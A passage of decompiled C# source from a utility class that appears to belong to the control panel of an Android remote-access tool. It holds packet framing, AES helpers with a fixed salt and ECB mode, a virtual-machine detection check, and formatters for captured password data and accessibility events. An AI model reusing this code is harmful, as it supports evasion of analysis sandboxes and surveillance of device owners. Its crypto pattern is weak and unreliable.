			memoryStream.Write(b, 0, (int)num);
			byte[] array2 = memoryStream.ToArray();
			array[0] = Codes.DEgzip(ref array2);
			memoryStream.Dispose();
			memoryStream = new MemoryStream();
			long num2 = (long)s.GetValue(1);
			memoryStream.Write(b, (int)num, (int)num2);
			array2 = memoryStream.ToArray();
			array[1] = Codes.DEgzip(ref array2);
			memoryStream.Dispose();
			return array;
		}
	}

	// Token: 0x06000336 RID: 822 RVA: 0x0004FE2C File Offset: 0x0004E02C
	public static object Formatpassdata(string msg)
	{
		object result;
		if (!msg.Contains("~"))
		{
			result = msg;
		}
		else
		{
			result = msg.Replace("~", "\r\n").Replace("[EOF]", "--------------");
		}
		return result;
	}

	// Token: 0x06000337 RID: 823 RVA: 0x0004FE70 File Offset: 0x0004E070
	public static string ExtractDomain(string input)
	{
		string result = "Blank";
		if (input.Contains("/"))
		{
			Uri uri;
			if (!Uri.TryCreate(input, UriKind.Absolute, out uri))
			{
				return input.Substring(0, input.IndexOf("/")).Trim();
			}
			result = uri.Host;
		}
		return result;
	}

	// Token: 0x06000338 RID: 824 RVA: 0x0004FEC8 File Offset: 0x0004E0C8
	private static int FindIndex(byte[] source, byte[] pattern)
	{
		checked
		{
			int num = source.Length - pattern.Length;
			int num2 = 0;
			IL_47:
			while (num2 <= num)
			{
				bool flag = true;
				int num3 = pattern.Length - 1;
				int i = 0;
				while (i <= num3)
				{
					if (source[num2 + i] == pattern[i])
					{
						i++;
					}
					else
					{
						flag = false;
						IL_40:
						if (!flag)
						{
							num2++;
							goto IL_47;
						}
						return num2;
					}
				}
				goto IL_40;
			}
			return -1;
		}
	}

	// Token: 0x06000339 RID: 825 RVA: 0x0004FF34 File Offset: 0x0004E134
	public static string BSDE(string Str)
	{
		return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Str));
	}

	// Token: 0x0600033A RID: 826 RVA: 0x0004FF54 File Offset: 0x0004E154
	public static Point FixSize(Form lc0, Form lc1)
	{
		checked
		{
			int num = lc0.Location.X + (int)Math.Round((double)lc0.Width / 2.0) - (int)Math.Round((double)lc1.Width / 2.0);
			int num2 = lc0.Location.Y + (int)Math.Round((double)lc0.Height / 2.0) - (int)Math.Round((double)lc1.Height / 2.0);
			if (num < 0)
			{
				num = 0;
			}
			if (num2 < 0)
			{
				num2 = 0;
			}
			if (num > Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width)
			{
				num = Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width;
			}
			if (num2 > Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height)
			{
				num2 = Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height;
			}
			return new Point(num, num2);
		}
	}

	// Token: 0x0600033B RID: 827 RVA: 0x000500D4 File Offset: 0x0004E2D4
	public static Array BytesConverter(long bytes)
	{
		long num = 1024L;
		long num2 = 1048576L;
		long num3 = 1073741824L;
		long num4 = 1099511627776L;
		string text = "0 Bytes";
		if (bytes < 1024L)
		{
			text = Conversions.ToString(bytes) + " Bytes";
		}
		else if (bytes > num4)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
		}
		else if (bytes > num3)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
		}
		else if (bytes > num2)
		{
			text = ((double)bytes / (double)num / (double)num).ToString("0.00") + " MB";
		}
		else if (bytes >= num)
		{
			text = ((double)bytes / (double)num).ToString("0.00") + " KB";
		}
		return new string[]
		{
			text.ToString()
		};
	}

	// Token: 0x0600033C RID: 828 RVA: 0x00050204 File Offset: 0x0004E404
	public static Array UploadDownload(long ParametersLong0, long ParametersLong1)
	{
		checked
		{
			Array result;
			try
			{
				if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init, new StaticLocalInitFlag(), null);
				}
				bool flag = false;
				try
				{
					Monitor.Enter(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init, ref flag);
					if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State == 0)
					{
						Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State = 2;
						Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload = ParametersLong0;
					}
					else if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State = 1;
					if (flag)
					{
						Monitor.Exit(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init);
					}
				}
				if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init, new StaticLocalInitFlag(), null);
				}
				bool flag2 = false;
				try
				{
					Monitor.Enter(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init, ref flag2);
					if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State == 0)
					{
						Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State = 2;
						Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload = ParametersLong1;
					}
					else if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State = 1;
					if (flag2)
					{
						Monitor.Exit(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init);
					}
				}
				long num = ParametersLong0 - Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload;
				long num2 = ParametersLong1 - Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload;
				Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload = ParametersLong0;
				Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload = ParametersLong1;
				result = new object[]
				{
					Codes.BytesConverter((num2 < 0L) ? 0L : num2).GetValue(0),
					Codes.BytesConverter((num < 0L) ? 0L : num).GetValue(0)
				};
			}
			catch (Exception)
			{
				result = new string[]
				{
					"n/a",
					"n/a"
				};
			}
			return result;
		}
	}

	// Token: 0x0600033D RID: 829 RVA: 0x000503EC File Offset: 0x0004E5EC
	public static byte[] DE(byte[] by, string k)
	{
		MemoryStream memoryStream = new MemoryStream();
		checked
		{
			using (MemoryStream memoryStream2 = new MemoryStream(by))
			{
				RijndaelManaged rijndaelManaged = Codes.Rijndle(k);
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream2, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read))
				{
					byte[] buffer = new byte[(int)(memoryStream2.Length - 1L) + 1];
					int count = cryptoStream.Read(buffer, 0, (int)memoryStream2.Length);
					memoryStream.Write(buffer, 0, count);
				}
			}
			return memoryStream.ToArray();
		}
	}

	// Token: 0x0600033E RID: 830 RVA: 0x00050490 File Offset: 0x0004E690
	private static RijndaelManaged Rijndle(string secretKey)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, System.Text.Encoding.Unicode.GetBytes("xy7h8842n61q50xf2x"));
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		checked
		{
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			return rijndaelManaged;
		}
	}

	// Token: 0x0600033F RID: 831 RVA: 0x00050514 File Offset: 0x0004E714
	public static byte[] FormatPacket(string Strings, byte[] bByte)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] array = Codes.CGzip(bByte);
		byte[] array2 = Codes.CGzip(Codes.Encoding().GetBytes(Strings));
		byte[] bytes = Codes.Encoding().GetBytes(Conversions.ToString(array2.Length));
		byte[] bytes2 = Codes.Encoding().GetBytes("\0");
		byte[] bytes3 = Codes.Encoding().GetBytes(Conversions.ToString(array.Length));
		memoryStream.Write(bytes, 0, bytes.Length);
		memoryStream.Write(bytes2, 0, bytes2.Length);
		memoryStream.Write(bytes3, 0, bytes3.Length);
		memoryStream.Write(bytes2, 0, bytes2.Length);
		memoryStream.Write(array2, 0, array2.Length);
		memoryStream.Write(array, 0, array.Length);
		byte[] result = memoryStream.ToArray();
		memoryStream.Dispose();
		return result;
	}

	// Token: 0x06000340 RID: 832 RVA: 0x000505D4 File Offset: 0x0004E7D4
	public static string[] GetStatistics(string data)
	{
		string text = "time=";
		string text2 = "packet loss";
		try
		{
			string text3 = data.ToLower();
			if (text3.Contains(text))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(text3.ToLower().Split(new string[]
				{
					text
				}, StringSplitOptions.None).GetValue(1));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Split", new object[]
				{
					new string[]
					{
						"ms"
					},
					StringSplitOptions.None
				}, null, null, null), null, "GetValue", new object[]
				{
					0
				}, null, null, null));
				text = Conversions.ToString(objectValue2).Trim();
			}
			else
			{
				text = "0";
			}
			if (text3.Contains(text2))
			{
				object objectValue3 = RuntimeHelpers.GetObjectValue(text3.Split(new string[]
				{
					text2
				}, StringSplitOptions.None).GetValue(0));
				object[] array = (object[])NewLateBinding.LateGet(objectValue3, null, "Split", new object[]
				{
					new string[]
					{
						","
					},
					StringSplitOptions.None
				}, null, null, null);
				text2 = Conversions.ToString(array.GetValue(checked(array.Length - 1)));
			}
		}
		catch (Exception)
		{
			return new string[]
			{
				"",
				""
			};
		}
		string[] result;
		if (Operators.CompareString(text2, "packet loss", false) == 0)
		{
			string[] array2 = new string[2];
			array2[0] = "";
			result = array2;
			array2[1] = "";
		}
		else
		{
			string[] array3 = new string[2];
			array3[0] = text.Trim();
			result = array3;
			array3[1] = text2.Trim();
		}
		return result;
	}

	// Token: 0x06000341 RID: 833 RVA: 0x0005077C File Offset: 0x0004E97C
	public static string GetIPAddress()
	{
		try
		{
			string hostName = Dns.GetHostName();
			IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
			foreach (IPAddress ipaddress in addressList)
			{
				if (ipaddress.ToString().StartsWith("192.168.1."))
				{
					return ipaddress.ToString();
				}
			}
		}
		catch (Exception)
		{
		}
		return "127.0.0.1";
	}

	// Token: 0x06000342 RID: 834 RVA: 0x000507EC File Offset: 0x0004E9EC
	public static int RateConverter(int Value, int Totalsize)
	{
		int result;
		try
		{
			result = ((Totalsize != 0) ? checked((int)Math.Round(unchecked((double)Value / (double)Totalsize * 100.0))) : 0);
		}
		catch (Exception)
		{
			result = 0;
		}
		return result;
	}

	// Token: 0x06000343 RID: 835 RVA: 0x00050830 File Offset: 0x0004EA30
	private static byte[] GenerateKey(string key)
	{
		byte[] bytes = System.Text.Encoding.UTF8.GetBytes(key);
		SHA256Managed sha256Managed = new SHA256Managed();
		return sha256Managed.ComputeHash(bytes);
	}

	// Token: 0x06000344 RID: 836 RVA: 0x00050858 File Offset: 0x0004EA58
	public static string AccessibilityEvent(int v)
	{
		string result;
		switch (v)
		{
		case 0:
			result = "CLICKED";
			break;
		case 1:
			result = "FOCUSED";
			break;
		case 2:
			result = "LONG CLICKED";
			break;
		case 3:
			result = "TEXT";
			break;
		case 4:
			result = "NOTIFICATION";
			break;
		case 5:
			result = "WINDOW CHANGED";
			break;
		default:
			result = "n/a";
			break;
		}
		return result;
	}

	// Token: 0x06000345 RID: 837
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern Codes.EXECUTION_STATE SetThreadExecutionState(Codes.EXECUTION_STATE esflags);

	// Token: 0x06000346 RID: 838 RVA: 0x000508BC File Offset: 0x0004EABC
	private static Codes.EXECUTION_STATE Power()
	{
		return Codes.SetThreadExecutionState((Codes.EXECUTION_STATE)(-2147483645));
	}

	// Token: 0x06000347 RID: 839 RVA: 0x00002786 File Offset: 0x00000986
	public static void AcquirePower()
	{
		Codes.Power();
	}

	// Token: 0x06000348 RID: 840 RVA: 0x000508D8 File Offset: 0x0004EAD8
	public static string AES_Encrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		ASCIIEncoding asciiencoding = new ASCIIEncoding();
		byte[] bytes = asciiencoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] bytes2 = System.Text.Encoding.ASCII.GetBytes(input);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes2, 0, bytes2.Length));
		}
		catch (Exception)
		{
		}
		return "";
	}

	// Token: 0x06000349 RID: 841 RVA: 0x00050958 File Offset: 0x0004EB58
	public static string AES_Decrypt(string text, string password)
	{
		string result;
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(text);
			string @string = System.Text.Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = @string;
		}
		catch (Exception)
		{
			result = "";
		}
		return result;
	}

	// Token: 0x0600034A RID: 842 RVA: 0x00050A00 File Offset: 0x0004EC00
	public static string Encrypt(string text, string password)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		byte[] bytes = System.Text.Encoding.ASCII.GetBytes(text);
		return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
	}

	// Token: 0x0600034B RID: 843 RVA: 0x00050A84 File Offset: 0x0004EC84
	public static string AesDecrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		ASCIIEncoding asciiencoding = new ASCIIEncoding();
		byte[] bytes = asciiencoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return System.Text.Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception)
		{
		}
		return "";
	}

	// Token: 0x0600034C RID: 844 RVA: 0x00050B04 File Offset: 0x0004ED04
	public static bool isVmw()
	{
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
		{
			using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					string text = managementBaseObject["Manufacturer"].ToString().ToLower();
					if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", false) == 0)
					{
						return true;
					}
				}
			}
		}
		return false;
	}

	// Token: 0x040003A6 RID: 934
	public const int HT_CAPTION = 2;

	// Token: 0x040003A7 RID: 935
	private static WebClient webc = new WebClient();

	// Token: 0x040003A8 RID: 936
	private static ImageAttributes imageAttributes = new ImageAttributes();

	// Token: 0x040003A9 RID: 937
	public const uint WDA_MONITOR = 1U;

	// Token: 0x040003AA RID: 938
	public static string TempPathCache = Path.Combine(Path.GetTempPath(), "AET", "Cache");

	// Token: 0x040003AB RID: 939
	public static string[] pngs = new string[]
	{
		"mipmap-hdpi-v4",
		"drawable-hdpi-v4",
		"mipmap-hdpi"
	};

	// Token: 0x040003AC RID: 940
	private static Random rshit;

	// Token: 0x040003AD RID: 941
	private static WebBrowser wb = new WebBrowser();

	// Token: 0x040003AE RID: 942
	private static long _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload;

	// Token: 0x040003AF RID: 943
	private static StaticLocalInitFlag _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init;

	// Token: 0x040003B0 RID: 944
	private static long _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload;

	// Token: 0x040003B1 RID: 945
	private static StaticLocalInitFlag _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init;

	// Token: 0x02000047 RID: 71
	private enum EXECUTION_STATE
	{
		// Token: 0x040003B3 RID: 947
		ES_SYSTEM_REQUIRED = 1,
		// Token: 0x040003B4 RID: 948
		ES_DISPLAY_REQUIRED,
		// Token: 0x040003B5 RID: 949
		ES_CONTINUOUS = -2147483648
	}

	// Token: 0x02000048 RID: 72
	[CompilerGenerated]
	internal sealed class _Closure_0024__26_002D0
	{
		// Token: 0x0600034F RID: 847 RVA: 0x00050C78 File Offset: 0x0004EE78
		public _Closure_0024__26_002D0(Codes._Closure_0024__26_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_random = arg0._0024VB_0024Local_random;
			}
		}

		// Token: 0x06000350 RID: 848 RVA: 0x00050CA0 File Offset: 0x0004EEA0
		internal char _Lambda_0024__0(string s)
		{
			return s[this._0024VB_0024Local_random.Next(s.Length)];
		}

		// Token: 0x06000351 RID: 849 RVA: 0x00050CA0 File Offset: 0x0004EEA0
		internal char _Lambda_0024__1(string s)
		{
			return s[this._0024VB_0024Local_random.Next(s.Length)];
		}

		// Token: 0x040003B6 RID: 950
		public Random _0024VB_0024Local_random;
	}
}
